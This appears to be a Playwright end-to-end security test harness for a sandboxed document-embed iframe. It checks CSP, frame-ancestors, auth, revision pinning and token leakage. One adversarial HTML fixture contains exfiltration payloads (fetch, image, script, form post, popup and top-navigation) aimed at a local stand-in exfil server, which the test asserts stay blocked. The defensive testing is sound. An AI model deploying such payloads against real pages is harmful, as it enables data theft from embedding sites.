// Two-origin browser check for the read-only document embed (DocumentEmbed.tsx).
//
// REAL:  Mk1 production build (dist/embed.html + assets, built with VITE_API_URL=/api)
//        served on http://127.0.0.1:8556 with the CSP/frame-ancestors header text
//        parsed out of nginx.conf's `location = /embed.html` (envsubst emulated).
// MOCK:  the Mk1 API under /api on the same origin (synthetic fixture data and a
//        synthetic JWT; implements the documented /auth/login and
//        /api/documents/{id}[/content] contract incl. `sandbox allow-scripts` CSP).
// HARNESS: "Paperclip" host page on http://localhost:8555 (cross-site to 127.0.0.1)
//        framing exactly what IssuePropertiesArtifactsTab renders (src format and
//        sandbox are asserted by Paperclip's unit tests). Not the Paperclip app.
// Run: npm run build (VITE_API_URL=/api) && node e2e/paperclip-embed/harness.mjs
import http from 'node:http'
import fs from 'node:fs'
import path from 'node:path'
import crypto from 'node:crypto'
import { chromium } from 'playwright'

const ROOT = path.resolve(import.meta.dirname, '../..')
const OUT = process.env.EMBED_E2E_OUT || 'C:/tmp/mk1-embed-e2e'
fs.mkdirSync(OUT, { recursive: true })
const MK1 = 'http://127.0.0.1:8556'
const PAPERCLIP = 'http://localhost:8555'
const ROGUE = 'http://localhost:8557'
const EXFIL = 'http://127.0.0.1:8558'
const JWT = 'synthetic.jwt.' + crypto.randomBytes(8).toString('hex')

const nginx = fs.readFileSync(path.join(ROOT, 'nginx.conf'), 'utf8')
const embedCsp = /location = \/embed\.html \{[\s\S]*?add_header Content-Security-Policy "([^"]+)"/
  .exec(nginx)[1]
  .replace('${MK1_EMBED_FRAME_ANCESTORS}', PAPERCLIP)

const STYLED = `<!doctype html><html><head><title>Synthetic report</title>
<style>/* accumark-docs v2 */ body{font-family:Georgia,serif;margin:24px} h1{color:rgb(12,74,110);font-weight:700;border-bottom:3px solid rgb(14,165,233)}
.kpi{display:inline-block;padding:8px 14px;background:rgb(240,249,255);border-radius:8px;margin-right:8px}</style></head>
<body><main><header class="top"><h1>Synthetic quarterly report</h1></header>
<section><span class="kpi">Samples 128</span><span class="kpi">On time 97%</span>
<svg width="240" height="80" role="img" aria-label="chart"><rect x="10" y="30" width="40" height="50" fill="rgb(14,165,233)"/><rect x="60" y="10" width="40" height="70" fill="rgb(12,74,110)"/></svg>
<script>document.querySelector('h1').dataset.scriptRan = 'yes'</script></section></main></body></html>`
const ADVERSARIAL = `<!doctype html><html><head><title>adv</title></head><body><h1>adversarial</h1>
<img src="${EXFIL}/img?leak=1"><script src="${EXFIL}/script.js"></script>
<link rel="stylesheet" href="${EXFIL}/style.css">
<form id="f" action="${EXFIL}/form" method="post"><input name="x" value="1"></form>
<script>
try { fetch('${EXFIL}/fetch?leak=1') } catch (e) {}
try { new Image().src = '${EXFIL}/img2' } catch (e) {}
try { document.getElementById('f').submit() } catch (e) {}
try { window.open('${EXFIL}/popup') } catch (e) {}
try { top.location = '${EXFIL}/top' } catch (e) {}
setTimeout(() => { try { location.href = '${EXFIL}/selfnav' } catch (e) {} }, 300)
</script></body></html>`
const sha = s => crypto.createHash('sha256').update(s, 'utf8').digest('hex')
const DOCS = {
  12: { code: 'ART-0012', revision: 2, status: 'draft', title: 'Synthetic quarterly report', html: STYLED },
  13: { code: 'ART-0013', revision: 1, status: 'active', title: 'Adversarial fixture', html: ADVERSARIAL },
  14: null, // hidden or missing: Mk1 answers 404 either way
}
let revoked = false
const exfilHits = []
const mk1Hits = []

const row = (id, d) => ({
  id: Number(id), code: d.code, revision: d.revision, title: d.title, status: d.status,
  content_sha256: sha(d.html), space_slug: 'general',
  revisions: [{ id: Number(id), revision: d.revision }],
})

const types = { '.js': 'text/javascript', '.css': 'text/css', '.html': 'text/html', '.svg': 'image/svg+xml', '.woff2': 'font/woff2' }
const mk1 = http.createServer((req, res) => {
  const url = new URL(req.url, MK1)
  mk1Hits.push(req.url)
  const json = (status, body) => { res.writeHead(status, { 'content-type': 'application/json' }); res.end(JSON.stringify(body)) }
  if (url.pathname === '/api/auth/login' && req.method === 'POST') {
    return json(200, { access_token: JWT, token_type: 'bearer', user: { id: 7, email: 'reader@example.test', role: 'standard' } })
  }
  const m = /^\/api\/api\/documents\/(\d+)(\/content)?$/.exec(url.pathname)
  if (m) {
    if (req.headers.authorization !== `Bearer ${JWT}` || revoked) return json(401, { detail: 'Not authenticated' })
    const d = DOCS[m[1]]
    if (!d) return json(404, { detail: 'Document not found' })
    if (m[2]) {
      res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'content-security-policy': 'sandbox allow-scripts', 'x-content-type-options': 'nosniff' })
      return res.end(d.html)
    }
    return json(200, row(m[1], d))
  }
  const file = url.pathname === '/' ? '/index.html' : url.pathname
  const p = path.join(ROOT, 'dist', file)
  if (!p.startsWith(path.join(ROOT, 'dist')) || !fs.existsSync(p)) { res.writeHead(404); return res.end() }
  const headers = { 'content-type': types[path.extname(p)] || 'application/octet-stream' }
  if (file === '/embed.html') Object.assign(headers, { 'content-security-policy': embedCsp, 'x-content-type-options': 'nosniff', 'referrer-policy': 'no-referrer', 'cache-control': 'no-cache' })
  res.writeHead(200, headers)
  res.end(fs.readFileSync(p))
})

const embedSrc = id => {
  const d = DOCS[id] ?? { code: 'ART-0014', revision: 1, html: 'x' }
  const h = new URLSearchParams({ id: String(id), code: d.code, rev: String(d.revision), sha: sha(d.html) })
  return `${MK1}/embed.html#${h}`
}
const hostPage = (src, label) => `<!doctype html><html><head><meta charset="utf-8"></head><body style="font-family:sans-serif;margin:12px">
<p>HARNESS host (${label}) — frames exactly what Paperclip's AccuMk1 row renders</p>
<iframe id="mk1" title="doc" src="${src}" sandbox="allow-scripts allow-same-origin allow-forms" referrerpolicy="no-referrer" style="width:900px;height:620px;border:1px solid #ccc"></iframe></body></html>`
const host = label => http.createServer((req, res) => {
  const url = new URL(req.url, 'http://x')
  const src = url.searchParams.get('raw') ? `${MK1}${url.searchParams.get('raw')}` : embedSrc(url.searchParams.get('id') || '12')
  res.writeHead(200, { 'content-type': 'text/html' })
  res.end(hostPage(src, label))
})
const exfil = http.createServer((req, res) => { exfilHits.push(req.url); res.writeHead(204); res.end() })

const listen = (srv, port, h) => new Promise(r => srv.listen(port, h, r))
await listen(mk1, 8556, '127.0.0.1')
const pc = host('Paperclip localhost:8555'); await listen(pc, 8555, '127.0.0.1')
const rogue = host('NOT allowlisted localhost:8557'); await listen(rogue, 8557, '127.0.0.1')
await listen(exfil, 8558, '127.0.0.1')

const results = []
const check = (name, ok, detail = '') => { results.push({ name, ok, detail }); console.log(`${ok ? 'PASS' : 'FAIL'} ${name}${detail ? ' — ' + detail : ''}`) }
const browser = await chromium.launch()
const ctx = await browser.newContext({ viewport: { width: 960, height: 700 } })
const page = await ctx.newPage()
const consoleLines = []
page.on('console', m => consoleLines.push(`[${m.type()}] ${m.text()}`))
page.on('pageerror', e => consoleLines.push(`[pageerror] ${e.message}`))
const requested = []
ctx.on('request', r => requested.push(r.url()))
const embedFrame = () => page.frames().find(f => f.url().startsWith(`${MK1}/embed.html`))
const state = async () => embedFrame()?.locator('[data-embed-state]').first().getAttribute('data-embed-state', { timeout: 8000 })
const shot = async n => { await page.screenshot({ path: `${OUT}/${n}.png` }); return `${OUT}/${n}.png` }

try {
  await page.goto(`${PAPERCLIP}/?id=12`)
  await page.waitForTimeout(1500)
  check('cross-site frame starts signed out (partitioned storage, no token passed)', (await state()) === 'auth', await shot('01-auth-required'))

  const f = embedFrame()
  await f.fill('input[name=email]', 'reader@example.test')
  await f.fill('input[name=password]', 'synthetic-password')
  await f.click('button[type=submit]')
  await page.waitForTimeout(1500)
  check('in-frame sign-in renders the pinned draft revision', (await state()) === 'ready')
  const inner = embedFrame().childFrames()[0]
  const h1 = inner.locator('h1')
  const style = await h1.evaluate(e => { const s = getComputedStyle(e); return { color: s.color, weight: s.fontWeight, script: e.dataset.scriptRan || 'no' } })
  check('document styling applied inside sandbox', style.color === 'rgb(12, 74, 110)' && style.weight === '700', JSON.stringify(style))
  check('inline document script ran (charts/theme contract)', style.script === 'yes')
  check('draft label shown', (await embedFrame().locator('[data-embed-status="draft"]').count()) === 1)
  const sandbox = await embedFrame().locator('iframe').getAttribute('sandbox')
  check('document frame sandbox is exactly allow-scripts', sandbox === 'allow-scripts', sandbox)
  await shot('02-rendered-draft')

  await page.reload(); await page.waitForTimeout(1500)
  check('sign-in persists in the frame partition across reload', (await state()) === 'ready')

  await page.goto(`${PAPERCLIP}/?id=13`); await page.waitForTimeout(2500)
  check('adversarial doc rendered (contained)', (await state()) === 'ready', await shot('03-adversarial'))
  check('no request reached the exfil origin', exfilHits.length === 0, JSON.stringify(exfilHits))
  check('top-level page never navigated', page.url().startsWith(PAPERCLIP), page.url())
  check('no popup opened', ctx.pages().length === 1)

  await page.goto(`${PAPERCLIP}/?id=14`); await page.waitForTimeout(1500)
  check('hidden/missing doc shows restricted state', (await state()) === 'unavailable', await shot('04-restricted'))

  const bad = new URLSearchParams({ id: '12', code: 'ART-0012', rev: '2', sha: 'f'.repeat(64) })
  await page.goto(`${PAPERCLIP}/?raw=${encodeURIComponent('/embed.html#' + bad)}`); await page.waitForTimeout(1500)
  check('stale/mismatched hash refuses to render', (await state()) === 'mismatch', await shot('05-mismatch'))
  const staleRev = new URLSearchParams({ id: '12', code: 'ART-0012', rev: '1', sha: sha(STYLED) })
  await page.goto(`${PAPERCLIP}/?raw=${encodeURIComponent('/embed.html#' + staleRev)}`); await page.waitForTimeout(1500)
  check('stale revision number refuses to render', (await state()) === 'mismatch')

  revoked = true
  await page.goto(`${PAPERCLIP}/?id=12`); await page.waitForTimeout(1500)
  check('revoked session (401) returns to sign-in', (await state()) === 'auth', await shot('06-revoked'))
  revoked = false

  await page.goto(`${ROGUE}/?id=12`); await page.waitForTimeout(1500)
  const rogueLoaded = page.frames().some(fr => fr.url().startsWith(`${MK1}/embed.html`) && fr !== page.mainFrame())
  let rogueRendered = false
  try { rogueRendered = (await embedFrame()?.locator('[data-embed-state]').count({ timeout: 1000 })) > 0 } catch { /* blocked */ }
  check('non-allowlisted parent cannot frame the embed', !rogueRendered, `frameUrlPresent=${rogueLoaded} ${await shot('07-rogue-parent-blocked')}`)

  await page.goto(`${PAPERCLIP}/?raw=${encodeURIComponent('/index.html')}`); await page.waitForTimeout(1500)
  const appFramed = page.frames().some(fr => fr.url() === `${MK1}/index.html`)
  results.push({ name: 'INFO: full app /index.html framable from Paperclip (pre-existing: nginx sends no frame header; unchanged)', ok: true, detail: `framed=${appFramed}` })
  console.log(`INFO full app /index.html framed=${appFramed} (pre-existing gap, not changed)`)

  const leaked = requested.filter(u => u.includes(JWT))
  check('JWT never appears in any request URL', leaked.length === 0, leaked.join(','))
  const srcs = await page.evaluate(() => [...document.querySelectorAll('iframe')].map(i => i.src))
  check('outer iframe src carries no token', !srcs.some(s => s.includes(JWT) || /token|jwt/i.test(s)))
} finally {
  fs.writeFileSync(`${OUT}/console.log`, consoleLines.join('\n'))
  fs.writeFileSync(`${OUT}/results.json`, JSON.stringify({ embedCsp, results, exfilHits }, null, 2))
  await browser.close()
  for (const s of [mk1, pc, rogue, exfil]) s.close()
}
const failed = results.filter(r => !r.ok)
console.log(`${results.length - failed.length}/${results.length} ok; artifacts in ${OUT}`)
process.exit(failed.length ? 1 : 0)
